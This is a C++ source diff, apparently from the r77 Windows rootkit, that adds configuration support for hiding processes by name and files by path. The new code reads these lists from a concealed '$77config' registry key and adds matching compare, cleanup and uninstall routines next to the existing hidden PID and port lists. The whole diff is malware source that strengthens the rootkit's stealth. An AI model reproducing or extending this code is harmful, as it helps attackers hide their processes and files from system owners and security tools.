@@ -15,6 +15,38 @@ VOID RandomString(PWCHAR str, DWORD length)
 
 	str[length] = L'\0';
 }
+LPCSTR ConvertStringToAString(LPCWSTR str)
+{
+	PCHAR result = NULL;
+
+	int length = WideCharToMultiByte(CP_ACP, 0, str, -1, NULL, 0, NULL, NULL);
+	if (length > 0)
+	{
+		result = new CHAR[length];
+		if (WideCharToMultiByte(CP_ACP, 0, str, -1, result, length, NULL, NULL) <= 0)
+		{
+			delete[] result;
+			result = NULL;
+		}
+	}
+
+	return result;
+}
+LPWSTR ConvertUnicodeStringToString(UNICODE_STRING str)
+{
+	if (str.Buffer)
+	{
+		PWCHAR buffer = new WCHAR[str.Length / sizeof(WCHAR) + 1];
+		wmemcpy(buffer, str.Buffer, str.Length / sizeof(WCHAR));
+		buffer[str.Length / sizeof(WCHAR)] = L'\0';
+
+		return buffer;
+	}
+	else
+	{
+		return NULL;
+	}
+}
 BOOL Is64BitOperatingSystem()
 {
 	BOOL wow64;
@@ -181,6 +213,23 @@ BOOL GetResource(DWORD resourceID, PCSTR type, LPBYTE *data, LPDWORD size)
 	}
 
 	return FALSE;
+}
+BOOL GetPathFromHandle(HANDLE file, LPWSTR fileName, DWORD fileNameLength)
+{
+	BOOL result = FALSE;
+
+	WCHAR path[MAX_PATH + 1];
+	if (GetFinalPathNameByHandleW(file, path, MAX_PATH, FILE_NAME_NORMALIZED) > 0 && !_wcsnicmp(path, L"\\\\?\\", 4))
+	{
+		PWCHAR resultFileName = &path[4];
+		if ((DWORD)lstrlenW(resultFileName) <= fileNameLength)
+		{
+			lstrcpyW(fileName, resultFileName);
+			result = TRUE;
+		}
+	}
+
+	return result;
 }
 BOOL ReadFileContent(LPCWSTR path, LPBYTE *data, LPDWORD size)
 {
@@ -677,6 +726,86 @@ VOID ReadR77ConfigKey(PR77_CONFIG config, HKEY key)
 		RegCloseKey(pidKey);
 	}
 
+	// Read process names from the "process_names" subkey.
+	HKEY processNameKey;
+	if (RegOpenKeyExW(key, L"process_names", 0, KEY_READ, &processNameKey) == ERROR_SUCCESS)
+	{
+		DWORD count;
+		if (RegQueryInfoKeyW(processNameKey, NULL, NULL, NULL, NULL, NULL, NULL, &count, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
+		{
+			WCHAR valueName[100];
+			WCHAR processName[MAX_PATH + 1];
+
+			for (DWORD i = 0; i < count; i++)
+			{
+				DWORD valueNameLength = 100;
+				DWORD type;
+				DWORD processNameSize = MAX_PATH;
+				if (RegEnumValueW(processNameKey, i, valueName, &valueNameLength, NULL, &type, (LPBYTE)&processName, &processNameSize) == ERROR_SUCCESS && type == REG_SZ)
+				{
+					BOOL isNew = TRUE;
+
+					for (DWORD p = 0; p < config->HiddenProcessNameCount; p++)
+					{
+						if (!lstrcmpiW(config->HiddenProcessNames[p], processName))
+						{
+							isNew = FALSE;
+							break;
+						}
+					}
+
+					if (isNew && config->HiddenProcessNameCount < R77_CONFIG_MAX_HIDDEN_PROCESS_NAMES)
+					{
+						config->HiddenProcessNames[config->HiddenProcessNameCount] = new WCHAR[lstrlenW(processName) + 1];
+						lstrcpyW(config->HiddenProcessNames[config->HiddenProcessNameCount++], processName);
+					}
+				}
+			}
+		}
+
+		RegCloseKey(processNameKey);
+	}
+
+	// Read paths from the "paths" subkey.
+	HKEY pathKey;
+	if (RegOpenKeyExW(key, L"paths", 0, KEY_READ, &pathKey) == ERROR_SUCCESS)
+	{
+		DWORD count;
+		if (RegQueryInfoKeyW(pathKey, NULL, NULL, NULL, NULL, NULL, NULL, &count, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
+		{
+			WCHAR valueName[100];
+			WCHAR path[MAX_PATH + 1];
+
+			for (DWORD i = 0; i < count; i++)
+			{
+				DWORD valueNameLength = 100;
+				DWORD type;
+				DWORD pathSize = MAX_PATH;
+				if (RegEnumValueW(pathKey, i, valueName, &valueNameLength, NULL, &type, (LPBYTE)&path, &pathSize) == ERROR_SUCCESS && type == REG_SZ)
+				{
+					BOOL isNew = TRUE;
+
+					for (DWORD p = 0; p < config->HiddenPathCount; p++)
+					{
+						if (!lstrcmpiW(config->HiddenPaths[p], path))
+						{
+							isNew = FALSE;
+							break;
+						}
+					}
+
+					if (isNew && config->HiddenPathCount < R77_CONFIG_MAX_HIDDEN_PATHS)
+					{
+						config->HiddenPaths[config->HiddenPathCount] = new WCHAR[lstrlenW(path) + 1];
+						lstrcpyW(config->HiddenPaths[config->HiddenPathCount++], path);
+					}
+				}
+			}
+		}
+
+		RegCloseKey(pathKey);
+	}
+
 	// Read local TCP ports from the "tcp_local" subkey.
 	HKEY tcpLocalKey;
 	if (RegOpenKeyExW(key, L"tcp_local", 0, KEY_READ, &tcpLocalKey) == ERROR_SUCCESS)
@@ -798,14 +927,20 @@ PR77_CONFIG LoadR77Config()
 {
 	PR77_CONFIG config = new R77_CONFIG();
 	config->HiddenProcessIdCount = 0;
+	config->HiddenProcessNameCount = 0;
+	config->HiddenPathCount = 0;
 	config->HiddenTcpLocalPortCount = 0;
 	config->HiddenTcpRemotePortCount = 0;
 	config->HiddenUdpPortCount = 0;
 	config->HiddenProcessIds = new DWORD[R77_CONFIG_MAX_HIDDEN_PROCESS_IDS];
+	config->HiddenProcessNames = new LPWSTR[R77_CONFIG_MAX_HIDDEN_PROCESS_NAMES];
+	config->HiddenPaths = new LPWSTR[R77_CONFIG_MAX_HIDDEN_PATHS];
 	config->HiddenTcpLocalPorts = new USHORT[R77_CONFIG_MAX_HIDDEN_TCP_LOCAL_PORTS];
 	config->HiddenTcpRemotePorts = new USHORT[R77_CONFIG_MAX_HIDDEN_TCP_REMOTE_PORTS];
 	config->HiddenUdpPorts = new USHORT[R77_CONFIG_MAX_HIDDEN_UDP_PORTS];
 	ZeroMemory(config->HiddenProcessIds, sizeof(DWORD) * R77_CONFIG_MAX_HIDDEN_PROCESS_IDS);
+	ZeroMemory(config->HiddenProcessNames, sizeof(LPWSTR) * R77_CONFIG_MAX_HIDDEN_PROCESS_NAMES);
+	ZeroMemory(config->HiddenPaths, sizeof(LPWSTR) * R77_CONFIG_MAX_HIDDEN_PATHS);
 	ZeroMemory(config->HiddenTcpLocalPorts, sizeof(USHORT) * R77_CONFIG_MAX_HIDDEN_TCP_LOCAL_PORTS);
 	ZeroMemory(config->HiddenTcpRemotePorts, sizeof(USHORT) * R77_CONFIG_MAX_HIDDEN_TCP_REMOTE_PORTS);
 	ZeroMemory(config->HiddenUdpPorts, sizeof(USHORT) * R77_CONFIG_MAX_HIDDEN_UDP_PORTS);
@@ -852,7 +987,18 @@ PR77_CONFIG LoadR77Config()
 }
 VOID DeleteR77Config(PR77_CONFIG config)
 {
+	for (DWORD i = 0; i < config->HiddenProcessNameCount; i++)
+	{
+		delete[] config->HiddenProcessNames[i];
+	}
+	for (DWORD i = 0; i < config->HiddenPathCount; i++)
+	{
+		delete[] config->HiddenPaths[i];
+	}
+
 	delete[] config->HiddenProcessIds;
+	delete[] config->HiddenProcessNames;
+	delete[] config->HiddenPaths;
 	delete[] config->HiddenTcpLocalPorts;
 	delete[] config->HiddenTcpRemotePorts;
 	delete[] config->HiddenUdpPorts;
@@ -875,6 +1021,30 @@ BOOL CompareR77Config(PR77_CONFIG configA, PR77_CONFIG configB)
 			for (DWORD i = 0; i < configA->HiddenProcessIdCount; i++)
 			{
 				if (configA->HiddenProcessIds[i] != configB->HiddenProcessIds[i]) return FALSE;
+			}
+		}
+		else
+		{
+			return FALSE;
+		}
+
+		if (configA->HiddenProcessNameCount == configB->HiddenProcessNameCount)
+		{
+			for (DWORD i = 0; i < configA->HiddenProcessNameCount; i++)
+			{
+				if (lstrcmpiW(configA->HiddenProcessNames[i], configB->HiddenProcessNames[i])) return FALSE;
+			}
+		}
+		else
+		{
+			return FALSE;
+		}
+
+		if (configA->HiddenPathCount == configB->HiddenPathCount)
+		{
+			for (DWORD i = 0; i < configA->HiddenPathCount; i++)
+			{
+				if (lstrcmpiW(configA->HiddenPaths[i], configB->HiddenPaths[i])) return FALSE;
 			}
 		}
 		else
@@ -925,6 +1095,8 @@ VOID UninstallR77Config()
 {
 	// Delete HKEY_LOCAL_MACHINE\$77config
 	RegDeleteKeyExW(HKEY_LOCAL_MACHINE, L"Software\\" HIDE_PREFIX L"config\\pid", KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0);
+	RegDeleteKeyExW(HKEY_LOCAL_MACHINE, L"Software\\" HIDE_PREFIX L"config\\process_names", KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0);
+	RegDeleteKeyExW(HKEY_LOCAL_MACHINE, L"Software\\" HIDE_PREFIX L"config\\paths", KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0);
 	RegDeleteKeyExW(HKEY_LOCAL_MACHINE, L"Software\\" HIDE_PREFIX L"config\\tcp_local", KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0);
 	RegDeleteKeyExW(HKEY_LOCAL_MACHINE, L"Software\\" HIDE_PREFIX L"config\\tcp_remote", KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0);
 	RegDeleteKeyExW(HKEY_LOCAL_MACHINE, L"Software\\" HIDE_PREFIX L"config\\udp", KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0);
@@ -950,6 +1122,14 @@ VOID UninstallR77Config()
 
 					lstrcpyW(subKeyName, configKeyName);
 					lstrcatW(subKeyName, L"\\pid");
+					RegDeleteKeyExW(HKEY_USERS, subKeyName, KEY_ALL_ACCESS, 0);
+
+					lstrcpyW(subKeyName, configKeyName);
+					lstrcatW(subKeyName, L"\\process_names");
+					RegDeleteKeyExW(HKEY_USERS, subKeyName, KEY_ALL_ACCESS, 0);
+
+					lstrcpyW(subKeyName, configKeyName);
+					lstrcatW(subKeyName, L"\\paths");
 					RegDeleteKeyExW(HKEY_USERS, subKeyName, KEY_ALL_ACCESS, 0);
 
 					lstrcpyW(subKeyName, configKeyName);
